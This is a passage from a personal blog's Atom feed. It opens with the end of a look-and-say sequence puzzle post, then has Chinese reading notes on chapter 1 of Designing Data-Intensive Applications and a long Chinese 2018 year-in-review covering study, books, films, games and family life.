<td><strong>79</strong></td>          <td>311311222113111221</td>          <td>18</td>          <td>(47)(58)</td>        </tr>        <tr>          <td><strong>80</strong></td>          <td>311311222113111221131221</td>          <td>24</td>          <td>(47)(59)</td>        </tr>        <tr>          <td><strong>81</strong></td>          <td>31131122211311122113222</td>          <td>23</td>          <td>(47)(60)</td>        </tr>        <tr>          <td><strong>82</strong></td>          <td>3113112221133112</td>          <td>16</td>          <td>(47)(33)(61)(29)(92)</td>        </tr>        <tr>          <td><strong>83</strong></td>          <td>311312</td>          <td>6</td>          <td>(45)</td>        </tr>        <tr>          <td><strong>84</strong></td>          <td>31132</td>          <td>5</td>          <td>(46)</td>        </tr>        <tr>          <td><strong>85</strong></td>          <td>311322113212221</td>          <td>15</td>          <td>(53)</td>        </tr>        <tr>          <td><strong>86</strong></td>          <td>311332</td>          <td>6</td>          <td>(38)(29)(89)</td>        </tr>        <tr>          <td><strong>87</strong></td>          <td>3113322112</td>          <td>10</td>          <td>(38)(30)</td>        </tr>        <tr>          <td><strong>88</strong></td>          <td>3113322113</td>          <td>10</td>          <td>(38)(31)</td>        </tr>        <tr>          <td><strong>89</strong></td>          <td>312</td>          <td>3</td>          <td>(34)</td>        </tr>        <tr>          <td><strong>90</strong></td>          <td>312211322212221121123222113</td>          <td>27</td>          <td>(36)</td>        </tr>        <tr>          <td><strong>91</strong></td>          <td>312211322212221121123222122</td>          <td>27</td>          <td>(35)</td>        </tr>        <tr>          <td><strong>92</strong></td>          <td>32112</td>          <td>5</td>          <td>(37)</td>        </tr>      </tbody>    </table></p><p>Those 92 subsequence is so basic that is constructs every member in the look-and-saysequence. Just like 92 elements. <a href="http://mathworld.wolfram.com/CosmologicalTheorem.html">Here</a>gives the periodic table of atoms associated with the look-and-say sequenceas named by Conway(1987). As we can see, 3113112211322112 links to <strong>Br</strong>, and311311 links to <strong>Ba</strong>.</p><p><strong>Br</strong>eaking <strong>Ba</strong>d. That is the answer.</p><h2><span id="0x02-more"><strong>0x02 More</strong></span></h2><p>That is perfect from the begining to the end. Many thanks to the problemmaker, and the screenwriters, also everyexcellent actors in Breaking Bad.</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      One problem at Haidian Book City
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>Hello World!</title>
    <link href="https://qiwihui.com/qiwihui-blog-1/"/>
    <id>https://qiwihui.com/qiwihui-blog-1/</id>
    <published>2018-10-09T04:44:19.000Z</published>
    <updated>2024-05-15T02:25:31.472Z</updated>
    
    <content type="html"><![CDATA[<p>Hello from qiwihui.</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Hello World!
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>第一章：可靠性，可扩展性，可维护性</title>
    <link href="https://qiwihui.com/ddia-1/"/>
    <id>https://qiwihui.com/ddia-1/</id>
    <published>2018-09-10T04:44:19.000Z</published>
    <updated>2022-08-13T01:54:25.630Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="di-yi-zhang-ke-kao-xing-ke-kuo-zhan-xing-ke-wei-hu-xing">第一章：可靠性，可扩展性，可维护性</span></h1><p>数据密集型（data-intensive）而非计算密集型（compute-intensive）：</p><ul><li>数据量、数据复杂性、以及数据的变更速度</li><li>数据密集型应用基本组件<ul><li>存储数据，以便自己或其他应用程序之后能再次找到 （<strong><em>数据库（database）</em></strong>）</li><li>记住开销昂贵操作的结果，加快读取速度（<strong><em>缓存（cache）</em></strong>）</li><li>允许用户按关键字搜索数据，或以各种方式对数据进行过滤（<strong><em>搜索索引（search indexes）</em></strong>）</li><li>向其他进程发送消息，进行异步处理（<strong><em>流处理（stream processing）</em></strong>）</li><li>定期处理累积的大批量数据（<strong><em>批处理（batch processing）</em></strong>）</li></ul></li><li>一个可能的组合使用多个组件的数据系统架构：</li></ul><p><img src="https://user-images.githubusercontent.com/3297411/125434927-f4ac7199-069a-4bd5-8ed8-b5748a1b97da.png" alt="Untitled"></p><p>影响数据系统设计的因素很多，包括参与人员的技能和经验、历史遗留问题、系统路径依赖、交付时限、公司的风险容忍度、监管约束等。</p><p>重要的三个问题；</p><ul><li><p><strong><em>可靠性（Reliability）</em></strong></p><p>系统在<strong>困境（adversity）</strong>（硬件故障、软件故障、人为错误）中仍可正常工作（正确完成功能，并能达到期望的性能水准）。</p></li><li><p><strong><em>可扩展性（Scalability）</em></strong></p><p>有合理的办法应对系统的增长（数据量、流量、复杂性）。</p></li><li><p><strong><em>可维护性（Maintainability）</em></strong></p><p>随着时间的推移，许多新的人员参与到系统开发和运维， 以维护现有功能或适配 新场景等，系统都应高效运转。</p></li></ul><h2><span id="ke-kao-xing">可靠性</span></h2><p>期望:</p><ul><li>应用程序执行用户所期望的功能。</li><li>可以容忍用户出现错误或者不正确的软件使用方怯 。</li><li>性能可以应对典型场 景 、 合 理负载压力和数据 量。</li><li>系统可防止任何未经授权的访问和滥用。</li></ul><p>故障（fault）和失效（failure）：</p><ul><li>故障：系统的一部分状态偏离其标准；</li><li>失效：系统作为一个整体停止向用户提供服务。</li><li>由于出现fault的几率不可能为0，因此倾向于设计fault-tolerant而不是fault-preventing的系统。</li></ul><h3><span id="ying-jian-gu-zhang">硬件故障</span></h3><ul><li>随机的、相互独立的</li><li>计算机系统中的硬盘、内存、power grid等零件都可能出问题，这可以通过增加单个硬件的冗余度（redundancy）来减少整个系统宕机的概率；</li><li>随着数据量和应用计算需求的增加，增加设备冗余也无法解决，就需要考虑如何在某个机器宕机的情况下通过软件调度来防止整个服务崩溃。</li></ul><h3><span id="ruan-jian-gu-zhang">软件故障</span></h3><ul><li>系统性错误的BUG难以预料，通常在异常情况被触发，例如Linux内核的润秒BUG；</li><li>没有快速解决办法，只能在实现时：<ul><li>认真检查依赖的假设条件与系统之间交互</li><li>进行全面的测试</li><li>进程隔离</li><li>允许进程崩愤并自动重启</li><li>反复评估</li><li>监控井分析生产环节的行为表现</li></ul></li></ul><h3><span id="ren-wei-gu-zhang">人为故障</span></h3><ul><li>人类是不可靠的，操作人员的不当操作占系统崩溃的75%～90%</li><li>如何降低：<ul><li>以最小出错的方式来设计系统；</li><li>想办住分离最容易出错的地方、容易引发故障的接口，提供sandbox让他们熟悉使用方法，随意犯错而不会影响生产；</li><li>充分的测试：unit/integration/manual；</li><li>当出现人为失误时，提供快速的恢复机制以尽量减少故障影响；</li><li>设置详细而清晰的监控子系统，包括性能指标和错误率；</li><li>推行管理流程井加以培训。</li></ul></li></ul><h2><span id="ke-kuo-zhan-xing"><strong><em>可扩展性</em></strong></span></h2><p>系统不见得一直可靠，比如负载增加，系统需要持续变化。</p><h3><span id="heng-liang-fu-zai-load">衡量负载（Load）</span></h3><ul><li>根据系统特性简洁描述，例如服务器的每秒请求处理次数，数据库读写比例，用户数量， 缓存命中率</li><li>Twitter例子<ul><li>需求<ul><li>用户发推(avg 4.6k RPS，max 12k RPS)</li><li>查看个人主页时间线(300k RPS)</li></ul></li><li>挑战：如何快速为用户提供timeline。<ol><li>直接从数据库读查询，涉及join，在请求多的时候数据库无法处理；</li><li>考虑为每个用户维护时间线的缓存，只是发推的时候就需要更新对应用户的缓存；</li><li>混合：由于发推的RPS远小于查询，缓存的方法对读更有优势，但是对于follower众多的大号，发推需要写入的缓存可能非常多，因此可以考虑针对这种大号直接写入数据库，在时间线单独从数据库读大号的推。</li></ol></li></ul></li></ul><h3><span id="heng-liang-xing-neng-performance">衡量性能（Performance）</span></h3><ul><li>两个问题：<ul><li>增加负载参数并保持系统资源（CPU、内存、网络带宽等）不变时，系统性能将受到什么影响？</li><li>增加负载参数并希望保持性能不变时，需要增加多少系统资源？</li></ul></li><li>吞吐量（throughput）：每秒可以处理的记录数量，或者在特定规模数据集上运行作业的总时间；</li><li>响应时间（response time）和延迟（latency）<ul><li>响应时间：网络延迟 + queuing + service time</li><li>延迟：请求花费在处理上的时间。</li></ul></li><li>百分位数（Percentile）：<ul><li>响应时间如果直接数学平均，无法反映大致有多少请求受到影响</li><li>p95, p99, p999表示有95%, 99%, 99.9%的请求的响应时间快于某个值。</li></ul></li><li>尾部延迟（tail latencies）：响应时间的高百分位点有时也很重要<ul><li>对于Amazon，大客户请求的数据量大，响应时间也就更长，不能不关注。</li></ul></li><li>SLO/SLA: Service Level Objective/Agreements, 用百分位数来判断系统是否可用。</li><li>测试时负载生成独立于响应时间来持续发送请求，不能等到收到响应才轰下一个请求。</li></ul><h3><span id="ying-dui-fu-zai-zeng-jia-de-fang-fa">应对负载增加的方法</span></h3><ul><li>纵向扩展（scaling up）（垂直扩展（vertical scaling），转向更强大的机器）</li><li>横向扩展（scaling out） （水平扩展（horizontal scaling），将负载分布到多台小机器上）</li></ul><h2><span id="ke-wei-hu-xing">可维护性</span></h2><p>软件开发本身开销并不算大，日后的维护升级需要花费更多。</p><p>软件系统的三个设计原则：</p><ul><li><p>可运维性（Operability）</p><p>方便运营团队来保持系统平稳运行。</p></li><li><p>简单性（Simplicity）简化系统复杂性，使新工程师能够轻松理解系统。注意这与用户界面的简单性并不一样。</p></li><li><p>可演化性（Evolvability）后续工程师能够轻松地对系统进行改进，井根据需求变化将其适配到非典型场景，也称为可延伸性、易修改性或可塑性。</p></li></ul><h3><span id="ke-yun-wei-xing">可运维性</span></h3><ul><li>良好的监控</li><li>自动化</li><li>避免依赖单台机器</li><li>良好的文档和易于理解的操作模型</li><li>默认行为和可覆盖</li><li>自我修复</li><li>行为可预测</li><li>其他<ul><li>适当的日志来跟踪出问题（系统故障或性能下降）的根源</li><li>保证系统能升级，尤其是安全补丁</li><li>正确的配置</li><li>开发时遵循最佳实践</li></ul></li></ul><h3><span id="jian-dan-xing">简单性</span></h3><p>保证代码简洁，让新加入的码农也能理解代码。一个很有效的方法是抽象，用高级类来描述统一的行为。</p><ul><li>防止状态空间爆炸</li><li>让系统中的模块尽量解耦，减少依赖</li><li>保证一致的命名</li><li>减少短视的hacks</li></ul><h3><span id="ke-yan-hua-xing">可演化性</span></h3><p>方便后续重构、加入新功能那个，与前面的简单性息息相关。</p><ul><li>敏捷工作模式比较方便改变</li><li>TDD：测试驱动开发</li></ul><h2><span id="can-kao">参考</span></h2><ul><li><a href="https://bobbyliujb.github.io/2020/01/14/designing_data_intensive_app/">https://bobbyliujb.github.io/2020/01/14/designing_data_intensive_app/</a></li></ul><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      Hello World!
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>年度总结 - 2018年全年复盘</title>
    <link href="https://qiwihui.com/qiwihui-blog-43/"/>
    <id>https://qiwihui.com/qiwihui-blog-43/</id>
    <published>2018-03-11T17:51:13.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>2019年一月已经过半，本该在年底十二月完成的总结又到现在才开始着笔。2018年发生了很多事，从年初比特币大涨至最高到现在互联网寒冬已至，不断变化的是环境，不变的是每年一次的年终总结。（误）</p><span id="more"></span><h2><span id="ji-zhu">技术</span></h2><p>做为一个程序员，在保持自己技术水平同时，应当不断地学习，总结和思考新的技术，才能在这个行业不至于被淘汰。互联网寒冬来临之时，对于还不能掌握形式的我也只能先增强自身能力以期减少这个寒冬带来影响。</p><h3><span id="ji-qi-xue-xi-he-shen-du-xue-xi">机器学习和深度学习</span></h3><p>从2017年年底开始涉足机器学习深度学习，先是学习然后在工作项目中实践，至今一年有余。机器学习和深度学习从吴恩达的<a href="https://www.coursera.org/learn/machine-learning">《机器学习》</a>和<a href="https://www.coursera.org/specializations/deep-learning">《深度学习》</a>课程开始，吴恩达的课程简洁易懂，逻辑清楚，虽然都是英文，但也没有太大关系。不过这两个课程注重算法胡实现，缺少项目，因此可以需要 <a href="http://fast.ai">fast.ai</a> 的<a href="https://course.fast.ai/ml.html">机器学习</a>和<a href="https://course.fast.ai/start.html">深度学习课程</a>来巩固掌握。主要使用的框架是 <code>Scikit-learn</code>，<code>Keras</code> 和 <code>Tensorflow</code>，这三个掌握不足。之后在公司安全项目中使用了一些分析和算法，对于机器学习和深度学习的理解和应用也只能说是皮毛。</p><h3><span id="python-he-go">Python和Go</span></h3><ul><li>Python语法巩固；</li><li>Go语言熟悉了基本语法，能阅读代码，会简单编写；</li><li>入门Rust。</li></ul><h3><span id="ios-kai-fa">iOS 开发</span></h3><p>年初（2017年末）答应给朋友的电影推荐网站写一个 iOS App，结果朋友的站倒闭了也还没有开始。下定决心花了一个多月学习 《Beginning iOS 11 Programming With Swift 4.1》和练习，然后开始做一个基于机器学习的垃圾短信过滤App <a href="https://github.com/qiwihui/SMSFilters">SMSFilters</a>，功能模仿熊猫吃短信。刚开始就是一行代码写一天，一个Bug改一周，软件开发这种事情就是要不断实践才能对所学的知识掌握。</p><p>SMSFilters 使用 Jieba 分词处理短信，然后用词袋模型提取特征，最后用 LinearSVC 训练，写 SMSFilters 遇到的第一个难题就是集成调用 CppJieba，没有经验，只能查文档，查StackOverflow，经过两周尝试，终于解决，过程可以参见 Demo 项目 <a href="https://github.com/qiwihui/SwiftJiebaDemo">SwiftJiebaDemo</a> 和博文<a href="https://blog.qiwihui.com/qiwihui-blog-45/">在iOS-Swift项目中集成CppJieba分词</a>。目前项目进展至使用模型进行垃圾短信判断。</p><h3><span id="kai-yuan-he-she-qu">开源和社区</span></h3><p>9月底请假去上海参加了今年的 Google 中国开发者大会，Google 是一家伟大公司，也是一家令人向往的公司.。Google 对于技术的追求也是有目共睹的。虽然 Google 重返中国进程一直很艰难，但不妨碍其技术传播。此次参加开发者大会让我体会最深的是 Google 对于技术的追求，以及用技术改变世界的理想。Google 分享的技术涉及 AI，Tensorflow，Android，Firebase，Flutter 以及 AR/VR 等，在用技术改变世界。</p><h3><span id="bo-ke-he-zi-xun">博客和资讯</span></h3><p>日常的咨询获取基本靠自订阅的 RSS，以及自己搭建的 RSSHub 和使用 <a href="http://feed43.com">feed43.com</a> 做的 feed，但是对于微信公众号，自从微广场停止之后，一直没有很好的获取工具。去年的博客数量更新很少，而且质量也不高，都是一些 “How to” 文，以及只写了大纲的几篇文章。</p><h3><span id="ren-wu-guan-li">任务管理</span></h3><p>9月看到 limboys 用 Trello 管理和记录日常的 <a href="https://trello.com/b/0LQ3Dyjg/limboys-life">Board</a>，很有条理，便开始使用 Trello 管理和记录包括看书，电影电视，以及项目，目前公开了两个 Board：<a href="https://trello.com/b/T4epspk2/qiwihuis-life">Qiwihui’s Life</a> 和 <a href="https://trello.com/b/fZ2i0xjA/%E6%8A%80%E6%9C%AF%E5%92%8C%E6%80%9D%E8%80%83">技术和思考</a>。Trello 的体验轻便，方便梳理，是迄今用过的最舒服的项目管理工具。</p><h3><span id="qi-ta">其他</span></h3><ol><li>Chrome扩展：Octo Previewer</li></ol><p>Fork并修改了一个 Chrome 扩展：<a href="https://chrome.google.com/webstore/detail/octo-previewer/bcgmcibilpjbffkbloafpiekljnaacpo">Octo Previewer</a>，用来实时预览 Github 上的 PRs，Issues，Gists 的 Markdown 评论。</p><ol start="2"><li>在macOS上基于docker构建透明代理</li></ol><p>Trello <a href="https://trello.com/c/Qw446FEY">卡片</a> 上记录这个过程。理论上是可行的，只是在有些工具上卡住了前进的路线。</p><ol start="3"><li>hiwifi-ss 项目</li></ol><p>这个基于极路由的翻墙项目没有持续维护，一则自己对于 lua 和 前端不熟悉，开发起来困难，二则我自己的极路由在搬家之后就没有了，再者极路由似乎大势已去，所以这个项目基本也就三四个月更新一次。这个项目给我带来的最大感触就是维护开源项目真的不容易。前些天看到 kalasoo 的文章<a href="https://juejin.im/post/5c21a3ea5188254eaa5c4486">《开源即责任》</a>也是有感触。</p><h2><span id="du-shu">读书</span></h2><p>2018年上半年忙与机器学习和项目，几乎没有读什么书，下半年（9月）开始入坑科幻小说。《三体》是一部好的科幻小说，但在国内《三体》造就的伪科幻迷群体以及随之而来的各种各种视为真理的概念着实令人难受，于是入坑科幻洗洗脑。科幻类基本都是名篇，看过之后，对于《三体》所带来的震撼减轻了不少，但是我更加佩服大刘了。</p><p><img src="https://user-images.githubusercontent.com/3297411/51372377-09ea9d80-1b38-11e9-921e-d59c4be63552.png" alt="books"></p><h3><span id="ji-zhu-lei">技术类</span></h3><ul><li><strong>《Node入门》</strong>：一本入门 node 的不错的简单<a href="https://www.nodebeginner.org/index-zh-cn.html">教程</a>。</li><li><strong>《Beginning iOS 11 Programming With Swift 4.1》</strong>：出自 Appcoda 的 iOS 开发入门教程，対初学者十分友好，详细介绍了开发一个 App 所需要的各个细节。</li><li><a href="https://legacy.gitbook.com/book/qiwihui/python-data-structure-cn/details">《python-data-structure-cn》</a>：Python数据结构简单介绍和实践，主要边帮着校对边读了。</li><li><a href="https://legacy.gitbook.com/book/qiwihui/sketch-tutorial-for-ios-developers">《给iOS开发者的Sketch入门教程》</a>：做图标。</li></ul><h3><span id="ke-huan-lei">科幻类</span></h3><ul><li><strong>《海伯利安》及《海伯利安的陨落》</strong>，丹·西蒙斯：太空歌剧，感叹于作者对七个朝圣者故事的精彩讲述，以及挖坑。</li><li><strong>《软件体的生命周期》</strong>，姜峯楠：一开始还以为是计算机的书，姜峯楠的中短篇非常有料，和之前看过的《你一生的故事》短篇集同样精彩。</li><li>《银河帝国》基地三部曲，包括 <strong>《基地》</strong>、<strong>《基地与帝国》</strong>、<strong>《第二基地》</strong>，艾萨克·阿西莫夫：经典中经典。</li><li>《银河帝国》机器人系列，包括 <strong>《我，机器人》</strong>、《钢穴》、《裸阳》、《曙光中的机器人》、《机器人与帝国》，艾萨克·阿西莫夫：对于机器人三大法则，作者一步步进行“推翻”补充的过程。</li><li>《平面国——及正方形的多维世界历险记》，埃德温·A·艾勃特：你如何看待二维世界，以及四维世界如何看你。</li><li>《童年的终结》，阿瑟·克拉克：“大规摸养猪场技术”，包括安抚，推荐。</li><li><strong>《与拉玛相会》</strong>，阿瑟·克拉克：小说对于 Rama 飞船的探索写的很详尽，以至于最后离开飞船后飞船的行动让我大气不敢出。</li></ul><h3><span id="shu-xue-lei">数学类</span></h3><ul><li>《从一到无穷大：科学中的事实和臆测》：科普，讲的东西很多，第一章是数论，第二章是相对论，第三章是微观世界，第四章是宏观世界，对于我无太多感想，必竟很多都知道了，感觉又看了一遍高中书。</li><li><strong>《素数之恋—黎曼和数学中最大的未解之迷》</strong>：理论和计算结合。</li><li><strong>《Riemann 猜想漫谈》</strong>：通俗易懂。</li></ul><p>关于素数的两本书，主要是因为菲尔兹奖与阿贝尔奖双料得主迈克尔·阿蒂亚爵士讲述他对黎曼猜想的证明，这次事件间引起了我详细了解黎曼猜想的兴趣，为此还专门购买了经典教材<a href="https://book.douban.com/subject/1707161/">《复变函数论方法》</a>，期待进一步了解。这两本书适合一起看，互相补充。不幸的是，迈克尔·阿蒂亚爵士，于 2019 年 1 月 11 日上午逝世，享年八十九岁。他最后的尝试，令人佩服！</p><blockquote><p>「我一直在尝试理解事物运行的原因。我对不能理解背后原理的公式不感兴趣。我总是试图挖掘事物背后的原理，所以如果我有一个公式，我就会去理解它为什么是这样。理解是一个非常困难的概念。人们认为数学的开始是你写下一个定理并附带证明。这不是开始，这是结束。对我来说，数学的创造性在你动手在纸上写字之前，在你尝试写公式之前。你描绘不同的事物，在脑海中反复思考。你尝试的创造，就像音乐家试图创作音乐，或诗人写诗一样。这个过程没有可以遵循的规律，你必须找到自己的方法。但到了最后，就像作曲家必须写下乐谱一样，你必须把它写下来。但最重要的一步是理解。证明公式本身可能不能让你理解。你可能有一个很长的证明，但到最后却不知道它为何是这样。但为了理解，你必须找到类似于直觉的能力，你必须感受它。」</p><p>——迈克尔·阿蒂亚爵士</p></blockquote><h3><span id="qi-ta-lei">其他类</span></h3><ul><li>《黑客（计算机革命的英雄）》：家酿计算机俱乐部以及上古黑客的事迹，看完这个可以看看 <strong>《黑镜：潘达斯奈基》</strong>，可以看到许多影子。</li><li>《此间的少年》，江南：之前没看完补上的。</li></ul><p>今年看的非技术书基本都是在上下班坐着公交看的，积少成多，也就多了。今年的体会就是读书如抽丝。多读书涨见识。</p><h2><span id="dian-ying-dian-shi-ju">电影、电视剧</span></h2><p>平常看电影电视有时候喜欢写着代码，可能也不太记得太多，讲讲喜欢的吧。</p><p><img src="https://user-images.githubusercontent.com/3297411/51374373-c5620080-1b3d-11e9-8be9-45074f4f2954.png" alt="movies"></p><ul><li>《碟中碟6：全面瓦解》：阿汤哥不老开挂。</li><li>《dele ディーリー 人生删除事务所》：其实不喜欢，以删除人生的名义偷窥以至修改别人的人生。</li><li><strong>《知无涯者 The Man Who Knew Infinity》</strong>：印度小哥开启挂来连哈代都服。</li><li><strong>《超级科学伙伴》</strong>：和一群点了“超人”技能树的科学家一起拯救世界是一种怎样的体验。</li><li><strong>《我的三体》</strong>（第一季，第二季）：《我的世界》+《三体》简直不要太开心，可能是唯一的视频画面质量以可见的速度在变化的动画。</li><li>《神奇动物：格林德沃之罪》：挖坑之作，“英特纳雄耐尔，就一定要实现！”。</li><li><strong>《神秘博士》</strong>（第十一季）：换了编剧之后十三姨没有自己的特点，期待圣诞之后的几集能好转。</li><li>《邪不压正》：如果那个北京城是真的。</li><li>《世界奇妙物语 2018年春季特别篇》：意外好看一些。</li><li><strong>《辛普森一家》</strong>（第三十季）：小黄人一家的故事。</li><li><strong>《孤独的美食家》</strong>（第七季）：“凭谁问，廉颇老矣，尚能饭否？”</li><li><strong>《深夜食堂》</strong>（第三季）：看的不是菜，是人间百味。</li></ul><h2><span id="you-xi">游戏</span></h2><p>年初买了 Nitendo Switch，不过没有太多时间花在玩游戏上，以至于《塞尔达传说：荒野之息》和《超级马里奥：奥德赛》都没有通关，只是偶尔用来玩玩 AoV，不过 NS 的体验确实非常不错，不论是个人还是联机，值得推荐。个人觉得游戏在于娱乐放松，若影响正常工作和情绪则视为不可，曾记得大学玩游戏还冲别人发过脾气也是太年轻。</p><h3><span id="wang-zhe-rong-yao-he-arena-of-valor">《王者荣耀》 和 《Arena of Valor》</span></h3><p>我在王者荣耀S13赛季又重新玩了一段时间，每天三五局，升个一星两星就停止，掉个一星两星也停止，就这样达到了个人历史最好成绩，不过这个过程给我带来的影响也不少。一个是我发现在白天的队友比较坑，而到了夜晚会好很多，估计是小学生都去睡觉了，所以我每到十一二点就开始玩，有时会因为连胜而玩到很晚，以致停止一段时间之后仍不能好好早睡，严重影响精神状态；二是一局结束又开一局，犹如赌博，赢则更想赢，输则不服气，往往计较于一城得失，实在是影响心气。这个游戏不能投入太多时间。</p><h3><span id="sai-er-da-chuan-shuo-huang-ye-zhi-xi-he-chao-ji-ma-li-ao-ao-de-sai">《塞尔达传说：荒野之息》 和 《超级马里奥：奥德赛》</span></h3><p><img src="https://user-images.githubusercontent.com/3297411/51376783-24c30f00-1b44-11e9-9991-97de85cf9fc2.jpeg" alt="zelda"></p><p>很不错的游戏，只是都还没有玩通关，需要补上。</p><h3><span id="lu-xing-qing-wa">《旅行青蛙》</span></h3><p>就和养儿子一样（虽然作者说的是丈夫），总是担心种种，吃没吃好，有没有被雨淋，有没有被欺负，路上还有钱吗。这就是为人父母的体验吧。</p><h3><span id="chi-ji">吃鸡</span></h3><p>接触不多，不过和《王者荣耀》这种是一样的感受。看过一些游戏主播的视频，佩服一个LOL职业玩家转吃鸡的主播，在战场上沉稳，有判断。</p><h3><span id="ingress">Ingress</span></h3><p>已经弃坑了，一则是因为满级了，并没有刷成就的习惯，同时也因为没有太多时间出门，二则官方一直没有太多的积极活动，每次就是换一个地方刷牌子，再则在手机升级到 iOS 11 之后，官方推出了 Ingress Prime，游戏体验万分糟糕，之前的版本却不升级，遂弃。Ingress玩了四五年，也疯狂过，但是还是离开吧。</p><h2><span id="sheng-huo">生活</span></h2><ol><li>婚姻</li></ol><p>今年一大事就是和老婆领证了，还没有办酒席，两人都商量着简办，请亲戚吃个饭就感觉已经很隆重了。参加了几次同学的婚礼，无非接亲，闹新郎，宣个誓言，在众亲友面前挥泪感恩，对于这样重复的婚礼，也没有太大的兴趣。梦想人生的婚礼应当刺激，可以在远山，或者，招待一群好友，准备一堆食物，准备一段给大家的表演，大家也可以上台表演，发表自己的感想。</p><ol start="2"><li>旅行</li></ol><ul><li>7月在云台山，看大山，打水战，舒畅。</li><li>9月青龙峡，人生第一次蹦极，刺激。</li><li>10月湖南长沙，看橘子洲头，品长沙臭豆腐，一般。</li></ul><ol start="3"><li>养猫</li></ol><p><img src="https://user-images.githubusercontent.com/3297411/51398607-fdd5fe80-1b7e-11e9-901d-beeb45277005.jpg" alt="cat"></p><p>11月，迎来家庭另一个成员，一只英国短毛蓝猫，取名“狗狗”。虽然有时会觉得这和取狗蛋差不多，也不知道会不会让其他猫看不起。第一次养猫，总是担心这担心那，生怕他生病了，像极了父母。久了我也发现他还是很粘人的，不知道年后给他找了女朋友之后会不会还是这么粘人。</p><ol start="4"><li>关于亲戚和钱</li></ol><p>十月，堂弟找我借钱周转，并承诺四天还，鉴于有承诺而且是亲戚，也就爽快借了。第一次到期没任何动静，还钱还是再接着一句话也没说，我问了才换来一句“明天，明天一定换”，接着第二次就是“最迟不会超过后天下午”，然后是到期还了一半，我没收，要全款，就继续拖着，一星期没动静，问了几句就变成在外地学习没开手机，“明天下午三点之前”，然后“再给一个小时”，“我手机没电了”。最后钱是还了，但是我对他的信任一点都没有了，直接拉黑！这件事让伙我认识到一点：在钱面前，亲戚的嘴脸也是令人恶心的。我借钱是因为我信任，却不代表你可以践踏。想起一个村民中奖却被村里人借得倾家荡产，村里人却觉得他有钱为什么就不能借点，可怕。</p><h2><span id="zhan-wang-2019">展望2019</span></h2><p>绝不是flag。</p><ol start="0"><li>做一份关于Python的知识小集，不求多，但求记录下一些易错，有深度的小知识点。同时过一遍Python的参考文档，阅读一些框架源码。</li><li>维护现有开源翻墙项目。</li><li>每两周至少一篇博客，记录的内容不能太基础，需要有思考。</li><li>深入了解计算机基础，包括系统原理、数据结构和算法、网络基础和编译原理，这四个方面每一个都阅读一本书籍，理解并掌握常用内容。</li><li>在leetcode上刷50题。</li><li>机器学习：学完fast.ai的机器学习课程。</li><li>深度学习：学习fast.ai的深度学习课程，对应同步阅读花书。</li><li>减少游戏时间，不在十一点以后玩游戏。</li><li>学会五笔打字，速度至少能达到60字/分钟。</li><li>在App store上至少上架一个App。</li><li>了解投资相关内容。</li></ol><h2><span id="xie-zai-zui-hou">写在最后</span></h2><p>人生需要有目标，需要一个积极乐观的心态，和一群志同道合的同伴。</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      年度总结 - 2018年全年复盘
    
    </summary>
    
      <category term="生活" scheme="https://qiwihui.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="总结" scheme="https://qiwihui.com/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
</feed>
